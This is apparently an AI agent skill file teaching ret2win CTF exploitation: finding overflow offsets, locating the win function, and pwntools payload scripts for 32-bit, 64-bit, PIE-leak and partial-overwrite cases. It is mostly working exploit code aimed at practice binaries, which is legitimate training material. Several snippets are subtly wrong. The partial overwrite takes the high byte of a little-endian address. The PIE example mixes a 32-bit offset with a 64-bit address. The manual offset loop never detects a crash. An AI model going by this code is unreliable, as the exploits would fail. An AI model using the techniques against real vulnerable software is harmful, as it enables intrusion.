---
name: ret2win-exploit
description: How to solve ret2win CTF challenges by exploiting buffer overflows to call a hidden win function. Use this skill whenever the user mentions ret2win, buffer overflow exploitation, calling a win/flag function, CTF binary exploitation, stack overflow to redirect execution, or any challenge where you need to overwrite a return address to execute a specific function. This applies to 32-bit and 64-bit binaries, with or without ASLR/PIE protections.
---

# Ret2Win Exploitation Guide

Ret2win challenges involve exploiting a buffer overflow vulnerability to overwrite the return address on the stack, redirecting execution to a hidden `win` function that prints the flag.

## Quick Start

1. **Analyze the binary** - Check protections and find the win function address
2. **Determine overflow offset** - Find how many bytes to the return address
3. **Craft the payload** - Padding + win function address
4. **Execute and iterate** - Run the exploit, adjust if needed

## Step 1: Binary Analysis

### Check Protections

```bash
# Check if PIE is enabled (bad for ret2win - addresses will randomize)
checksec --file vulnerable
# or
readelf -l vulnerable | grep GNU_RELRO

# Key protections to check:
# - PIE: If enabled, you need a leak or partial overwrite
# - Stack Canary: If enabled, you need to bypass it first
# - NX: Usually OK for ret2win (we're not injecting shellcode)
```

### Find the Win Function Address

```bash
# Method 1: Using objdump (static analysis)
objdump -d vulnerable | grep -A 20 '<win>'

# Method 2: Using gdb (dynamic analysis)
gdb ./vulnerable
(gdb) break win
(gdb) info address win
(gdb) x/i $pc

# Method 3: Using pwn (recommended)
from pwn import *
context.binary = './vulnerable'
b = ELF('./vulnerable')
print(hex(b.symbols['win']))
```

**Note:** If PIE is enabled, the address will be relative. You'll need a leak to get the base address, or use partial overwrite (see below).

## Step 2: Find the Overflow Offset

### Method 1: Pattern Create (pwntools)

```python
from pwn import *

# Generate a unique pattern
pattern = cyclic(100)

# Run the binary and send the pattern
p = process('./vulnerable')
p.sendline(pattern)

# When it crashes, note the EIP/RIP value from the crash
# Then find the offset:
offset = cyclic_find(crashed_eip_value)
print(f"Offset to return address: {offset}")
```

### Method 2: Manual Testing

```python
from pwn import *

p = process('./vulnerable')

# Try different lengths until you control EIP
for length in range(60, 100, 4):
    p = process('./vulnerable')
    p.sendline(b'A' * length)
    try:
        p.wait()
        if p.poll() is None:
            continue
    except:
        pass
    # Check if we crashed with controlled EIP
    # (you'll need to inspect the crash in gdb)
```

### Method 3: GDB with Pattern

```bash
# In gdb:
(gdb) break *main+50  # or wherever the vulnerable function is
(gdb) run
(gdb) # Send pattern via terminal
(gdb) # When it crashes:
(gdb) info registers eip
(gdb) # Note the value and calculate offset
```

## Step 3: Craft the Exploit

### Basic 32-bit Exploit (No ASLR, No PIE)

```python
from pwn import *

# Setup
context.binary = './vulnerable'
b = ELF('./vulnerable')

# Find addresses
win_addr = b.symbols['win']

# Determine offset (from Step 2)
offset = 68  # Example: 64 byte buffer + 4 byte saved EBP

# Craft payload
payload = b'A' * offset + p32(win_addr)

# Execute
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### 64-bit Exploit

```python
from pwn import *

context.binary = './vulnerable'
b = ELF('./vulnerable')

win_addr = b.symbols['win']
offset = 72  # 64-bit: 64 byte buffer + 8 byte saved RBP

payload = b'A' * offset + p64(win_addr)

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### With PIE (Need Leak)

```python
from pwn import *

context.binary = './vulnerable'
b = ELF('./vulnerable')

# First, leak a known address
p = process('./vulnerable')

# Send initial input to trigger leak (depends on challenge)
# Example: if there's a format string or read vulnerability
p.sendline(b'%p')  # or whatever triggers the leak
leaked_addr = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))

# Calculate base
base = leaked_addr - b.symbols['known_function']
win_addr = base + b.symbols['win']

# Now craft the ret2win payload
offset = 68
payload = b'A' * offset + p64(win_addr)

p.sendline(payload)
p.interactive()
```

### Partial Overwrite (When ASLR is on but last nibble is stable)

```python
from pwn import *

# If you can only overwrite 1-2 bytes of the return address
# and the last nibble of win's address is stable

context.binary = './vulnerable'
b = ELF('./vulnerable')

# Get the win address
win_addr = b.symbols['win']

# Extract the last 1-2 bytes that are stable
# For example, if win is at 0x401150 and last nibble is stable:
partial = p32(win_addr)[-1:]  # Last byte

# Craft payload with partial overwrite
offset = 68  # To reach return address
payload = b'A' * offset + partial

# You might need to try multiple times (1/16 chance per nibble)
for _ in range(100):
    p = process('./vulnerable')
    p.sendline(payload)
    if b'flag' in p.recvall():
        print("Got the flag!")
        break
```

## Common Scenarios

### Scenario 1: Simple 32-bit, No Protections

```python
from pwn import *

b = ELF('./vulnerable')
offset = 68
win = b.symbols['win']

payload = b'A' * offset + p32(win)

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### Scenario 2: 64-bit with ASLR, Need Leak

```python
from pwn import *

b = ELF('./vulnerable')

# Phase 1: Leak
p = process('./vulnerable')
# ... leak code ...
base = leaked - b.symbols['leaked_func']
win = base + b.symbols['win']

# Phase 2: Exploit
offset = 72
payload = b'A' * offset + p64(win)
p.sendline(payload)
p.interactive()
```

### Scenario 3: Partial Overwrite (1 byte)

```python
from pwn import *

b = ELF('./vulnerable')
win = b.symbols['win']

# Last byte of win address
partial = p32(win)[-1:]

offset = 68
payload = b'A' * offset + partial

# Retry loop for ASLR
for i in range(20):
    p = process('./vulnerable')
    p.sendline(payload)
    try:
        output = p.recvall()
        if b'flag' in output or b'Congratulations' in output:
            print(f"Success on attempt {i+1}!")
            print(output)
            break
    except:
        pass
```

## Debugging Tips

### Using GDB with Pwntools

```python
from pwn import *

context.binary = './vulnerable'

# Start with gdb
p = gdb.debug('./vulnerable', '''
    break *main+50
    continue
''')

# Or attach to running process
p = process('./vulnerable')
gdb.attach(p)
```

### Common Issues

| Issue | Solution |
|-------|----------|
| Segfault immediately | Offset is wrong, recalculate with cyclic |
| Wrong address | Check if PIE is on, use leak or partial overwrite |
| Canary error | Need to leak/bypass canary first |
| NX error | You're trying to execute stack, use ret2win not shellcode |
| Address changes each run | ASLR is on, disable with `setarch` or use leak |

### Disable ASLR for Testing

```bash
# Temporarily disable ASLR
sudo sysctl -w kernel.randomize_va_space=0

# Or run with setarch
setarch $(uname -m) -R ./vulnerable
```

## Using the Helper Scripts

The skill includes helper scripts to speed up exploitation:

```bash
# Generate a ret2win exploit template
python scripts/ret2win-exploit.py --binary ./vulnerable --offset 68 --arch 32

# Find function addresses
python scripts/find-win-addr.py ./vulnerable

# Test different offsets
python scripts/test-offset.py ./vulnerable --range 60-100
```

## References

- [HackTricks Ret2Win](https://book.hacktricks.xyz/pentesting/wr-pentesting/ret2win)
- [Pwntools Documentation](https://docs.pwntools.com/)
- [GuyInATuxedo Exploit Writeups](https://guyinatuxedo.github.io/)

## Key Takeaways

1. **Always check protections first** - PIE and canaries change the approach
2. **Find the exact offset** - Use cyclic patterns, don't guess
3. **Get the win address** - Static (objdump) or dynamic (gdb/pwn)
4. **Handle ASLR** - Leak, partial overwrite, or disable for testing
5. **Test iteratively** - Start simple, add complexity as needed
